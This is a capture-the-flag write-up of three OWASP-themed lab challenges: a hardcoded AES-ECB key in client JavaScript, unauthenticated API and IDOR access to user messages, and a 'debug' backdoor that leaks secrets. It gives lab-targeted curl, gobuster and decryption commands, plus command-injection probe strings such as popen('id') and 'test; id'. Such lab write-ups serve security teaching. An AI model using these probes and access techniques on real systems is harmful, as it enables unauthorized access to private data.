# OWASP Top 10 2025: Application Design Flaws

---

## Challenge 1 — Cryptographic Failures: Hardcoded Encryption Key

### Scenario
A "Secure Document Viewer" web app displayed a Base64-encoded, "encrypted" document and claimed the decryption feature was unavailable, hinting that only authorized personnel held the key.

### Recon
Loading the page's static JS at:
```
http://10.112.128.109:5004/static/js/decrypt.js
```
revealed the encryption configuration in plaintext:

```javascript
const SECRET_KEY = "my-secret-key-16";
const ENCRYPTION_MODE = "ECB";
const KEY_SIZE = 128;
```

This single file leaked everything needed to break the "encryption":
- **Algorithm:** AES
- **Key size:** 128-bit (matches the 16-byte key string)
- **Mode:** ECB (no IV required)
- **Key:** shipped directly in client-accessible JavaScript

### Exploitation
The encrypted blob shown on the page was Base64-encoded ciphertext. Decoding it produced 96 bytes — a clean multiple of the AES block size (16 bytes), consistent with valid ECB ciphertext.

Using Python (`pycryptodome`):

```python
import base64
from Crypto.Cipher import AES

ciphertext_b64 = "Nzd42HZGgUIUlpILZRv0jeIXp1WtCErwR+j/w/lnKbmug3lopX0BWy+pwK92rkhjwdf94mgHfLtF26X6B3pe2fhHXzIGnnvVruH7683KwvzZ6+QKybFWaedAEtknYkhe"

key = b"my-secret-key-16"          # 16 bytes = AES-128
data = base64.b64decode(ciphertext_b64)

cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(data)
print(plaintext)
```

**Output:**
```
CONFIDENTIAL: The admin password... Flag: THM{CRYPTO_FAILURE_H4RDCOD3D_K3Y}
```

The plaintext decrypted cleanly with valid PKCS#7 padding, confirming the key and mode were correct.

### Flag
```
THM{CRYPTO_FAILURE_H4RDCOD3D_K3Y}
```

### Root Cause & Lessons
This wasn't a cryptanalysis problem — AES itself is sound. The failure was architectural:
- **Secrets embedded in client-side code.** Anything shipped to the browser is public, full stop. A key baked into JavaScript provides zero real protection.
- **ECB mode compounds the problem.** Even if the key were secret, ECB's deterministic block-by-block encryption leaks structural patterns in the plaintext (identical plaintext blocks → identical ciphertext blocks).
- **Fix:** Never ship symmetric keys to the client. Decryption of sensitive data must happen server-side, behind authentication, using an authenticated mode (e.g. AES-GCM) with a securely managed key (vault/KMS), not a hardcoded string in source.

---

## Challenge 2 — Insecure Design: "Mobile-Only" Access Control Theater

### Scenario
"SecureChat" presented a landing page claiming the service was "designed exclusively for mobile devices" and pushed visitors to download a mobile app to access their private messages.

### Recon
Viewing the page source showed a static HTML page with **no client-side device-detection logic at all** (no JS checking `navigator.userAgent`, no responsive gating). This suggested the "mobile-only" restriction, if enforced at all, might be a purely cosmetic message rather than an actual technical control.

Testing confirmed this suspicion — spoofing a mobile `User-Agent` via curl returned the identical landing page:
```bash
curl -s -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)..." http://10.112.128.109:5005/
```
No content changed. This ruled out simple User-Agent–based gating and pointed to a different hypothesis: **the backend likely exposes an undocumented API meant only for the mobile app to consume — with no authentication enforcing that assumption.**

### Enumeration
A directory brute-force with `gobuster` located an interesting route:
```bash
gobuster dir -u http://10.112.128.109:5005 -w /usr/share/wordlists/dirb/common.txt -t 30
```
```
/console   (Status: 400)
```
This turned out to be a dead end (Werkzeug's debug console route, returning 400 regardless of headers/User-Agent used).

A targeted guess of REST-style API paths found the real issue:
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://10.112.128.109:5005/api/users
# 200
```

### Exploitation
`GET /api/users` returned a **fully unauthenticated user listing**:

```json
{
  "admin": { "email": "admin@example.com", "name": "Admin", "role": "admin" },
  "user1": { "email": "alice@example.com", "name": "Alice", "role": "user" },
  "user2": { "email": "bob@example.com", "name": "Bob", "role": "user" }
}
```

Using the leaked usernames, a follow-up guess of a per-user messages endpoint succeeded — another **Insecure Direct Object Reference (IDOR)**:

```bash
curl -s http://10.112.128.109:5005/api/messages/admin
```

```json
{
  "messages": [
    {
      "content": "Admin panel access key: THM{1NS3CUR3_D35IGN_4SSUMPTION}",
      "from": "system",
      "user": "admin"
    }
  ]
}
```

### Flag
```
THM{1NS3CUR3_D35IGN_4SSUMPTION}
```

### Root Cause & Lessons
This is a textbook **insecure design** failure, not a patchable coding bug:
- **Flawed trust assumption.** The developers assumed the only client capable of calling the backend API would be their own mobile app, so they built zero authentication or authorization into the API layer itself. The "mobile-only" message was security theater — a UX nudge, not a control.
- **Broken Access Control / IDOR.** Once the API surface was found, any user's private messages could be read just by supplying their username in the URL — no session, no token, no ownership check.
- **This mirrors the real-world Clubhouse case** referenced in the room material: private conversations were only "private" because nobody had bothered to query the backend directly.
- **Fix:** Design must assume any client can reach the API directly (browser, curl, script) — because eventually one will. Every endpoint needs real authentication (session/token) plus authorization checks that verify the requester owns the resource being accessed, independent of what UI or app "should" be the only caller.

---

## Challenge 3 — Software Supply Chain Failures: Debug Backdoor in an Unverified Dependency

### Scenario
A "Data Processing Service" exposed a documented REST API (`POST /api/process`, `GET /api/health`). The challenge stated the app "imports an old `lib/vulnerable_utils.py` component" — framing it as a third-party/unverified dependency, in line with the room's supply-chain theme.

### Recon
Baseline testing showed the `/api/process` endpoint simply uppercased input:
```bash
curl -s -X POST http://10.112.128.109:5003/api/process \
  -H "Content-Type: application/json" -d '{"data": "hello world"}'
# {"result": "Output: HELLO WORLD", "status": "success"}
```

Common injection payloads (SSTI, Python `eval`, shell command injection, format-string injection) were all safely escaped/uppercased — ruling out injection into the transform logic itself:

```bash
curl ... -d '{"data": "{{7*7}}"}'                                   # echoed literally
curl ... -d '{"data": "__import__(\"os\").popen(\"id\").read()"}'   # echoed literally
curl ... -d '{"data": "test; id"}'                                  # echoed literally
```

### Source Review
The application source (`app.py`) was obtained directly from the downloaded task files:

```python
from vulnerable_utils import process_data, format_output, debug_info

@app.route('/api/process', methods=['POST'])
def process():
    data = request.json.get('data', '')
    if not data:
        return jsonify({'error': 'Missing data parameter'}), 400

    # Check for debug mode
    if data == 'debug':
        return jsonify(debug_info())

    processed = process_data(data)
    formatted = format_output(processed)
    return jsonify({'result': formatted, 'status': 'success'})
```

Two supply-chain red flags stood out immediately:
1. `vulnerable_utils` is imported from a local, unverified/unaudited module (`sys.path.insert(0, .../lib)`) — exactly the "unverified third-party component" pattern the room warns about.
2. A **hardcoded debug bypass** (`if data == 'debug'`) calls `debug_info()` — a function from that unaudited library — and returns its output to *any unauthenticated caller*, with no access control whatsoever.

### Exploitation
```bash
curl -s -X POST http://10.112.128.109:5003/api/process \
  -H "Content-Type: application/json" -d '{"data": "debug"}'
```

```json
{
  "admin_token": "admin_token_12345",
  "flag": "THM{SUPPLY_CH41N_VULN3R4B1L1TY}",
  "internal_secret": "internal_secret_key_2024",
  "version": "1.2.3"
}
```

### Flag
```
THM{SUPPLY_CH41N_VULN3R4B1L1TY}
```

### Root Cause & Lessons
- **Unverified dependency, blindly trusted.** The application imported and called functions from a library it never audited (`vulnerable_utils.py`), including a function (`debug_info()`) that dumps internal secrets — exactly the "poisoned/unaudited component" risk the room describes.
- **Test/debug bypass left in production.** A magic-string backdoor (`data == 'debug'`) should never have shipped past development. It required no authentication and was trivially discoverable simply by reading the app's own source.
- **Fix:** Audit every third-party or local "library" component before importing it into a codebase — know exactly what each function does and what it exposes. Strip all debug hooks, backdoors, and test bypasses before deployment, and treat any dependency (even "internal" ones like `lib/`) as untrusted until reviewed, consistent with a proper software supply-chain review process (SBOM, dependency auditing, no unreviewed code paths reaching production).

---
